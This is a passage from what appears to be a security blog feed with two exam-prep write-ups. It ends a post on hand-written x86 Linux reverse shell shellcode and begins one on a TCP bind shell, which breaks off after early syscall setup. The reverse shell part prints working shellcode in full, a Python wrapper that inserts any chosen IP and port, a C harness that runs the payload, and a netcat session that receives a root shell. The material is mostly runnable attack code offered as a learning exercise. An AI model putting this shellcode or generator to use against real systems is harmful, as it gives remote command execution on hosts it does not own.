(0x3f) ; int dup2(int oldfd, int newfd); xor eax, eax mov al, 0x3f mov ebx, edi xor ecx, ecx int 0x80 ; first call with 0 xor eax, eax mov al, 0x3f mov ebx, edi mov cl, 0x1 int 0x80 ; second call with 1 xor eax, eax mov al, 0x3f mov ebx, edi mov cl, 0x2 int 0x80 ; third call with 2 ; syscall execve 11 (0xb) xor eax, eax push eax ; push //bin/sh and point at stack for 1st push 0x68732f6e push 0x69622f2f mov ebx, esp push eax mov ecx, esp push eax mov edx, esp xor eax, eax mov al, 0xb int 0x80 Now the reverse shell script is complete, we want to make sure we can assemble and link it without any errors. This is done with the following: root@kali:~/Documents/revshell# ../misc/build.sh first_reverse_shell Assembling first_reverse_shell.asm Linking first_reverse_shell.o Done At this point, I tested and confirmed that the reverse shell worked before moving on to the python wrapper that allows custom IP addresses and port values to be used within the reverse shell. We can then dump the hex from the assembled object, and check we don’t have any NULL bytes within the output. The contents of dump_hex.sh can be seen in the first post: root@kali:~/Documents/revshell# ../misc/dump_hex.sh first_reverse_shell &quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xfb\\x31\\xc9\\x51\\xc6\\x04\\x24\\x7f\\xc6\\x44\\x24\\x03\\x01\\x51\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x02\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot; Wrapper to allow custom IP address and Port number: Similar to the python wrapper used with our bind shell, this wrapper allows the user to specify their own port number. This number is then converted into hex values and placed within the correct position of our shellcode string. As well as the custom port number, I added functionality for custom IP addresses to be placed into the shellcode itself. I achieved this by taking the required instructions and their op codes from the ‘objdump -d’ output and created four separate chunks of these instructions. fourth_ip_asm = &quot;\\xc6\\x04\\x24\\x[4]&quot; # movb $0x7f,(%esp) (127) third_ip_asm = &quot;\\xc6\\x44\\x24\\x01\\x[3]&quot; # movb $0x1,0x1(%esp) (1) second_ip_asm = &quot;\\xc6\\x44\\x24\\x02\\x[2]&quot; # movb $0x1,0x2(%esp) (1) first_ip_asm = &quot;\\xc6\\x44\\x24\\x03\\x[1]&quot; # movb $0x1,0x3(%esp) (1) As we can see, each string contains a tag with an integer in there, i.e [1], [2]. These tags are later replaced by the chunk of the target IP address in the correct order and in their hex value. I think we can already see where this is going, but let’s continue. Once each one of these chunks has been correctly filled, the final shellcode has the tags ‘[i4][i3][i2][i1]’ replaced with their required instructions and our final payload is complete. This is then output to the screen, ready to place in our C based injection script. The complete python wrapper with tags that are replaced by user input can be seen below: root@kali:~/Documents/revshell# cat wrapper.py import sys import socket shellcode = ( &quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3&quot; &quot;\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01&quot; &quot;\\x89\\xfb\\x31\\xc9\\x51[i4][i3][i2][i1]\\x51\\x66\\x68[p2][p1]&quot; &quot;\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0&quot; &quot;\\xb0\\x3f\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89&quot; &quot;\\xfb\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x02&quot; &quot;\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f&quot; &quot;\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\x31\\xc0\\xb0&quot; &quot;\\x0b\\xcd\\x80&quot; ) fourth_ip_asm = &quot;\\xc6\\x04\\x24\\x[4]&quot; # movb $0x7f,(%esp) (127) third_ip_asm = &quot;\\xc6\\x44\\x24\\x01\\x[3]&quot; # movb $0x1,0x1(%esp) (1) second_ip_asm = &quot;\\xc6\\x44\\x24\\x02\\x[2]&quot; # movb $0x1,0x2(%esp) (1) first_ip_asm = &quot;\\xc6\\x44\\x24\\x03\\x[1]&quot; # movb $0x1,0x3(%esp) (1) if len(sys.argv) != 3: print 'Usage: ' + sys.argv[0] + ' &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;' sys.exit() ip = sys.argv[1] port = sys.argv[2] print &quot;Chosen ip: %s&quot; % ip print &quot;Chosen port: %s&quot; % port ip_chunks = [] try: socket.inet_aton(ip) ip_chunks = ip.split(&quot;.&quot;) if len(ip_chunks) &amp;lt; 4: print &quot;Although IP appears legal, we are assuming 4 chunks (i.e 127.0.0.1)&quot; sys.exit() except socket.error: print &quot;IP does not appear to be legal&quot; sys.exit() int_port = int(port) if int_port &amp;gt; 65535: print &quot;Port choice is greater than max value (65535)&quot; sys.exit() ip_hex_1 = hex(int(ip_chunks[0])) ip_hex_2 = hex(int(ip_chunks[1])) ip_hex_3 = hex(int(ip_chunks[2])) ip_hex_4 = hex(int(ip_chunks[3])) ip_hex_1 = ip_hex_1.replace(&quot;0x&quot;, &quot;&quot;) ip_hex_2 = ip_hex_2.replace(&quot;0x&quot;, &quot;&quot;) ip_hex_3 = ip_hex_3.replace(&quot;0x&quot;, &quot;&quot;) ip_hex_4 = ip_hex_4.replace(&quot;0x&quot;, &quot;&quot;) first_ip_asm = first_ip_asm.replace(&quot;[1]&quot;, ip_hex_1) second_ip_asm = second_ip_asm.replace(&quot;[2]&quot;, ip_hex_2) third_ip_asm = third_ip_asm.replace(&quot;[3]&quot;, ip_hex_3) fourth_ip_asm = fourth_ip_asm.replace(&quot;[4]&quot;, ip_hex_4) print first_ip_asm print second_ip_asm print third_ip_asm print fourth_ip_asm htons_port_val = socket.htons(int_port) hex_port_value = hex(htons_port_val) cleaned_hex_port = hex_port_value.replace(&quot;0x&quot;, &quot;&quot;) first_port_val = &quot;\\x&quot; + cleaned_hex_port[:2] second_port_val = &quot;\\x&quot; + cleaned_hex_port[2:] print &quot;1st port: %s&quot; % first_port_val print &quot;2nd port: %s&quot; % second_port_val print &quot;&quot; print &quot;Ammending shellcode...&quot; shellcode = shellcode.replace(&quot;[i4]&quot;, fourth_ip_asm) shellcode = shellcode.replace(&quot;[i3]&quot;, third_ip_asm) shellcode = shellcode.replace(&quot;[i2]&quot;, second_ip_asm) shellcode = shellcode.replace(&quot;[i1]&quot;, first_ip_asm) shellcode = shellcode.replace(&quot;[p2]&quot;, second_port_val) shellcode = shellcode.replace(&quot;[p1]&quot;, first_port_val) print &quot;Final Shellcode:&quot; print shellcode Using our wrapper: root@kali:~/Documents/revshell# python wrapper.py 127.0.0.1 9005 Chosen ip: 127.0.0.1 Chosen port: 9005 \xc6\x44\x24\x03\x7f \xc6\x44\x24\x02\x0 \xc6\x44\x24\x01\x0 \xc6\x04\x24\x1 1st port: \x2d 2nd port: \x23 Ammending shellcode... Final Shellcode: \x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x89\xfb\x31\xc9\x51\xc6\x04\x24\x1\xc6\x44\x24\x01\x0\xc6\x44\x24\x02\x0\xc6\x44\x24\x03\x7f\x51\x66\x68\x23\x2d\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\xb1\x02\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\x31\xc0\xb0\x0b\xcd\x80 Slightly hinted at before, we can see the above out has two instances of NULL bytes due to the address containing two zeros (127.0.0.1). Due to the IP being split up into 4 chunks and then pushed onto the stack separately, these 0 values still exist. A check can be performed in the python to ignore these two instructions if the value required is a 0. They can safely be ignored as the target address is XOR’d before hand - giving us the 0 value within the target byte already. The following is the python wrapper after being adapted to handle any lone zero’s in the specified IP address: The second draft of our Python wrapper can be seen below, preventing NULL bytes from being used in our target IP address, the main change is the four ‘if statements’ that check the hex value of the IP chunk is not equal to “0”, if it is, the chunk of instructions is cleared. import sys import socket shellcode = ( &quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3&quot; &quot;\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01&quot; &quot;\\x89\\xfb\\x31\\xc9\\x51[i4][i3][i2][i1]\\x51\\x66\\x68[p2][p1]&quot; &quot;\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0&quot; &quot;\\xb0\\x3f\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89&quot; &quot;\\xfb\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x02&quot; &quot;\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f&quot; &quot;\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\x31\\xc0\\xb0&quot; &quot;\\x0b\\xcd\\x80&quot; ) fourth_ip_asm = &quot;\\xc6\\x04\\x24\\x[4]&quot; # movb $0x7f,(%esp) (127) third_ip_asm = &quot;\\xc6\\x44\\x24\\x01\\x[3]&quot; # movb $0x1,0x1(%esp) (1) second_ip_asm = &quot;\\xc6\\x44\\x24\\x02\\x[2]&quot; # movb $0x1,0x2(%esp) (1) first_ip_asm = &quot;\\xc6\\x44\\x24\\x03\\x[1]&quot; # movb $0x1,0x3(%esp) (1) if len(sys.argv) != 3: print 'Usage: ' + sys.argv[0] + ' &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;' sys.exit() ip = sys.argv[1] port = sys.argv[2] print &quot;Chosen ip: %s&quot; % ip print &quot;Chosen port: %s&quot; % port ip_chunks = [] try: socket.inet_aton(ip) ip_chunks = ip.split(&quot;.&quot;) if len(ip_chunks) &amp;lt; 4: print &quot;Although IP appears legal, we are assuming 4 chunks (i.e 127.0.0.1)&quot; sys.exit() except socket.error: print &quot;IP does not appear to be legal&quot; sys.exit() int_port = int(port) if int_port &amp;gt; 65535: print &quot;Port choice is greater than max value (65535)&quot; sys.exit() ip_hex_1 = hex(int(ip_chunks[0])) ip_hex_2 = hex(int(ip_chunks[1])) ip_hex_3 = hex(int(ip_chunks[2])) ip_hex_4 = hex(int(ip_chunks[3])) ip_hex_1 = ip_hex_1.replace(&quot;0x&quot;, &quot;&quot;) ip_hex_2 = ip_hex_2.replace(&quot;0x&quot;, &quot;&quot;) ip_hex_3 = ip_hex_3.replace(&quot;0x&quot;, &quot;&quot;) ip_hex_4 = ip_hex_4.replace(&quot;0x&quot;, &quot;&quot;) first_ip_asm = first_ip_asm.replace(&quot;[1]&quot;, ip_hex_1) second_ip_asm = second_ip_asm.replace(&quot;[2]&quot;, ip_hex_2) third_ip_asm = third_ip_asm.replace(&quot;[3]&quot;, ip_hex_3) fourth_ip_asm = fourth_ip_asm.replace(&quot;[4]&quot;, ip_hex_4) # if any of the address chunks are equal to 0, clear the value so it is ignored. if ip_hex_1 == &quot;0&quot;: first_ip_asm = &quot;&quot; print &quot;1st IP chunk contained a NULL byte, ignoring&quot; else: print &quot;1st IP chunk asm: %s&quot; % first_ip_asm if ip_hex_2 == &quot;0&quot;: second_ip_asm = &quot;&quot; print &quot;2nd IP chunk contained a NULL byte, ignoring&quot; else: print &quot;2nd IP chunk asm: %s&quot; % second_ip_asm if ip_hex_3 == &quot;0&quot;: third_ip_asm = &quot;&quot; print &quot;3rd IP chunk contained a NULL byte, ignoring&quot; else: print &quot;3rd IP chunk asm: %s&quot; % third_ip_asm if ip_hex_4 == &quot;0&quot;: fourth_ip_asm = &quot;&quot; print &quot;4th IP chunk contained a NULL byte, ignoring&quot; else: print &quot;4th IP chunk asm: %s&quot; % fourth_ip_asm htons_port_val = socket.htons(int_port) hex_port_value = hex(htons_port_val) cleaned_hex_port = hex_port_value.replace(&quot;0x&quot;, &quot;&quot;) first_port_val = &quot;\\x&quot; + cleaned_hex_port[:2] second_port_val = &quot;\\x&quot; + cleaned_hex_port[2:] print &quot;1st port: %s&quot; % first_port_val print &quot;2nd port: %s&quot; % second_port_val print &quot;&quot; print &quot;Ammending shellcode...&quot; shellcode = shellcode.replace(&quot;[i4]&quot;, fourth_ip_asm) shellcode = shellcode.replace(&quot;[i3]&quot;, third_ip_asm) shellcode = shellcode.replace(&quot;[i2]&quot;, second_ip_asm) shellcode = shellcode.replace(&quot;[i1]&quot;, first_ip_asm) shellcode = shellcode.replace(&quot;[p2]&quot;, second_port_val) shellcode = shellcode.replace(&quot;[p1]&quot;, first_port_val) print &quot;Final Shellcode:&quot; print shellcode Running our Python wrapper once again produces NULL byte free shellcode that can be placed directly into our C script, allowing us to compile and inject the new payload: root@kali:~/Documents/revshell# cat shell.c #include&amp;lt;stdio.h&amp;gt; #include&amp;lt;string.h&amp;gt; unsigned char code[] = &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x89\xfb\x31\xc9\x51\xc6\x04\x24\x1\xc6\x44\x24\x03\x7f\x51\x66\x68\x23\x2d\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\xb1\x02\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\x31\xc0\xb0\x0b\xcd\x80&quot;; int main(void) { printf(&quot;Shellcode Length: %d\n&quot;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } We can finally compile our C program with the required arguments: root@kali:~/Documents/revshell# gcc -fno-stack-protector -z execstack shell.c -o shell We are now ready to try out our reverse shell. First we set up a listener on the specified port: root@kali:~/Documents/revshell# nc -nlvp 9005 listening on [any] 9005 ... We then execute our newly compiled shell: root@kali:~/Documents/revshell# ./shell Shellcode Length: 113 Looking back at our listener, we notice we have the successfully caught our reverse shell and have dropped into an interactive “/bin/sh” process: root@kali:~/Documents/revshell# nc -nlvp 9005 listening on [any] 9005 ... connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 40884 id uid=0(root) gid=0(root) groups=0(root)</summary></entry><entry><title type="html">x86 TCP Bind Shell</title><link href="http://localhost:4000/2020-01-07/slae32_tcp_bind_shell" rel="alternate" type="text/html" title="x86 TCP Bind Shell" /><published>2020-01-07T00:00:00+00:00</published><updated>2020-01-07T00:00:00+00:00</updated><id>http://localhost:4000/2020-01-07/slae32_tcp_bind_shell</id><content type="html" xml:base="http://localhost:4000/2020-01-07/slae32_tcp_bind_shell">&lt;h2 id=&quot;introduction&quot;&gt;Introduction:&lt;/h2&gt;
&lt;p&gt;During my prep for OSCE, my first goal was to learn to create a bind shell in x86, written from scratch. As we know, or may not know, a bind shell does what it says in the name. It binds a shell. Unlike a reverse shell, the process sets up a listener on the host and waits for a connection, once accepted it fires off our new process and pipes the connection through allowing commands to be sent from a remote system and return the output.&lt;/p&gt;

&lt;h2 id=&quot;brief-thoughts&quot;&gt;Brief thoughts:&lt;/h2&gt;
&lt;p&gt;The actual implementation of the TCP bind shell was relatively straight forward. Using a C based prototype I was able to make a list of required system calls and utilise the Linux man pages to confirm the arguments and how they would need to appear and be set up within the asm file. An important thing to remember is null bytes are bad. We don’t want these to exist in our final project so simple tricks were used to get around these (i.e xor’ing registers with themselves to zero them). These will be highlighted when, and where, they are used.&lt;/p&gt;

&lt;p&gt;## Initial planning:
To begin with, I needed to know how a TCP bind shell would be implemented in C. As I had just been looking through h0mbre_’s github write ups, I remembered they included a simple one so I used this as my base reference.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;strings.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;

int main(void) {
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;           
    server_addr.sin_addr.s_addr = INADDR_ANY;  
    server_addr.sin_port = htons(9001);        

    bind(listen_sock, (struct sockaddr *)&amp;amp;server_addr, sizeof(server_addr));

    listen(listen_sock, 0);

    int conn_sock = accept(listen_sock, NULL, NULL);

    dup2(conn_sock, 0);
    dup2(conn_sock, 1);
    dup2(conn_sock, 2);

    execve(&quot;/bin/sh&quot;, NULL, NULL);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once I had this, I was easily able to highlight the required system calls and start to gather the information I need to rebuild this is assembly. Utilising the Linux man pages and the Linux headers I crafted the following table which includes the syscall name, the C declaration (including parameters, types and return values) as well as the syscall number. This information may seem a little overkill right now, but it will become obvious when implementing the calls themselves later on in this write up.&lt;/p&gt;

&lt;p&gt;The following table lists the 6 system calls that are required to write our bind shell:&lt;/p&gt;

&lt;table class=&quot;mbtablestyle&quot;&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;System Call&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;C Definition&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Return Value&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Syscall Number&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;socket&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int socket(int domain, int type, int protocol);&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;File descriptor for the new socket.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;359 (0x167)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;bind&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;n/a&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;361 (0x169)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;listen&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int listen(int sockfd, int backlog);&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;n/a&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;363 (0x16b)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;accept&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;File descriptor for the new socket.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;364 (0x16c)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;dup2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int dup2(int oldfd, int newfd);&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;n/a&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;63 (0x3f)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;execve&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int execve(const char *pathname, char *const argv[], char *const envp[]);&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;n/a&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;11 (0xb)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;In order to create the above table, I used the following command with each syscall to obtain the C definition and return values from the linux manual pages:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;man 2 &amp;lt;function_name&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;As well as this, I used the following command to obtain the syscall value used within assembly to call the correct function:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep &amp;lt;function_name&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Crafting our shell (first draft):
First things first, we want to create the skeleton of our script (first_bind_shell.asm):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global   _start
section .text

_start:
        ; zero out the common registers that we are likely to use
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With close reference to the C script included above, we can begin crafting our system calls in their required order. Ensuring the registers are set up correctly relative to the required parameters.&lt;/p&gt;

&lt;p&gt;The first syscall required is the socket() call. This will create our TCP socket and return a value that we must keep track of, the file descriptor.  As this is our first syscall, I will break down the function and the registers required in order to successfully call it. The function description is int socket(int domain, int type, int protocol); and as we can see, the function is used in the following manner in C int listen_sock = socket(AF_INET, SOCK_STREAM, 0);&lt;/p&gt;

&lt;p&gt;From this we can identify the required steps in assembly from a pseudo code perspective:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Set the EAX register to hold the value of the syscall&lt;/li&gt;
  &lt;li&gt;Set the EBX register to hold the value of our first parameter (AF_INET)&lt;/li&gt;
  &lt;li&gt;Set the ECX register to hold the value of our second parameter (SOCK_STREAM)&lt;/li&gt;
  &lt;li&gt;Set the EDX register to hold the value of our third parameter (0)&lt;/li&gt;
  &lt;li&gt;Perform the syscall&lt;/li&gt;
  &lt;li&gt;Store the return value held in the EAX register after the syscall&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each one of these steps seems pretty simple to implement in assembly using ‘mov’ to place the correct values in the registers and ‘int 0x80’ to execute the syscall. The only information missing are the actual values for AF_INET and SOCK_STREAM, in C these are already defined with their integer values however, here we need the raw integer value.&lt;/p&gt;

&lt;p&gt;The easiest way to get these values would have been to ask my good friend Google. He seems pretty knowledgeable but instead I thought I might as well utilise the C types and dump their raw value.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;

int main(void){
        printf(&quot;AF_INET: %d\n&quot;, AF_INET);
        printf(&quot;SOCK_STREAM: %d\n&quot;, SOCK_STREAM);
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Compile and run:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/bindshell/misc# gcc test.c 
root@kali:~/Documents/bindshell/misc# ./a.out 
AF_INET: 2
SOCK_STREAM: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we have all the required information, we can set up our target registers correctly and perform our first system call to socket. Looking back at our pseudo code above, we can translate it into the following x86 assembly:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; SOCKET SYSCALL
; set up the registers
mov eax, 0x167
mov ebx, 0x2
mov ecx, 0x1

int 0x80              ;  execute the syscall
mov edi, eax          ;  store the return value in edi for future ref
; above pinched from h0mbre_
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We set EAX to equal 0x167 (359), this is the value used later when the ‘int 0x80’ instruction is hit, which performs the actual syscall to socket. We now want to set up the EBX and ECX registers to hold the parameter values for our call. We set EBX to equal 0x2 (value of AF_INET), and ECX to 0x1 (value of SOCK_STREAM). We can now execute our system call.&lt;/p&gt;

&lt;p&gt;Registers before the call:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  i r
eax            0x167               0x167
ecx            0x1                 0x1
edx            0x0                 0x0
ebx            0x2                 0x2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Registers after the call:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  i r
eax            0x3                 0x3
ecx            0x1                 0x1
edx            0x0                 0x0
ebx            0x2                 0x2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we mentioned before. The return value for socket() is stored in the EAX. We can see above that this value is 0x3 (3). This is now our file descriptor and should be used throughout the program within some of the other system calls:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;bind()&lt;/li&gt;
  &lt;li&gt;listen()&lt;/li&gt;
  &lt;li&gt;accept()&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We can safely keep track of this value by storing it in a register we are unlikely going to use, preventing the value from being corrupted and overwritten. This is done by the final instruction ‘mov edi, eax’.&lt;/p&gt;

&lt;p&gt;Whilst writing this, I was following the execution in gdb - confirming the registers were working the way I wanted them too and the correct call was being made. Once confirmed, it was time to move on to the next syscall - bind().&lt;/p&gt;

&lt;p&gt;Compared to the socket() system call, the bind() call requires quite a few more instructions to function correctly, including setting up the registers and pushing data onto the stack in the correct order, allowing us to obtain an address to use as a parameter. Looking at the C implementation of bind(), we can see 2 main sections of code include the creation of the ‘server_addr struct’ and the call to bind() itself.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sockaddr_in server_addr;
server_addr.sin_family = AF_INET;           
server_addr.sin_addr.s_addr = INADDR_ANY;  
server_addr.sin_port = htons(9001);        

bind(listen_sock, (struct sockaddr *)&amp;amp;server_addr, sizeof(server_addr));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first thing we want to do is make sure the EAX register holds the syscall number (361) ready for the execution, we can do this by placing 0x169 into the register. We then want to set our 1st parameter (EBX) to equal the file descriptor returned by the socket() function. Remember, this was stored in EDI.&lt;/p&gt;

&lt;p&gt;We now need our 2nd parameter (ECX) to point to a collection of data in memory that includes the AF_INET, INADDR_ANY and the target port number. To break this down further, we need to obtain our raw values for the following:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;AF_INET&lt;/li&gt;
  &lt;li&gt;INADDR_ANY&lt;/li&gt;
  &lt;li&gt;Port value (string) in hex&lt;/li&gt;
  &lt;li&gt;The size of the structure itself&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Similar to before, I created a small C program to print these values to the screen:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;

int main(void){
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = INADDR_ANY;
        server_addr.sin_port = htons(9001);

        printf(&quot;AF_INET: %d\n&quot;, server_addr.sin_family);
        printf(&quot;INADDR_ANY: %d\n&quot;, server_addr.sin_addr.s_addr);
        printf(&quot;SIZE OF: %d\n&quot;, sizeof(server_addr));
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Compiling and executing the script gave me the following information:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/bindshell/misc# ./b.out 
AF_INET: 2
INADDR_ANY: 0
SIZE OF: 16
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

